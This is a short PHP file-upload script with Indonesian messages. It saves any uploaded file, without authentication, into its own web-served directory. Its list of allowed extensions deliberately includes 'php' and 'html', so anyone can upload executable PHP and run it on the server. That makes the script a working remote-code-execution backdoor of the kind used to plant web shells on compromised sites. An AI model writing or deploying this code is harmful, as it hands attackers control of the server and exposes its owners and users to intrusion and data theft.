<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        $filename = basename($file['name']);
        $targetPath = __DIR__ . '/' . $filename;

        $fileType = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $allowedTypes = ['jpg', 'jpeg', 'php', 'html'];

        if (!in_array($fileType, $allowedTypes)) {
            die("Format file tidak diizinkan!");
        }

        // Pindahkan file ke folder yang sama dengan script
        if (move_uploaded_file($file['tmp_name'], $targetPath)) {
            echo "File berhasil diunggah: $filename";
        } else {
            echo "Gagal mengunggah file.";
        }
    } else {
        echo "Tidak ada file yang diunggah.";
    }
} else {
    echo '<form method="POST" enctype="multipart/form-data">
            Pilih file: <input type="file" name="file">
            <input type="submit" value="Upload">
          </form>';
}
?>
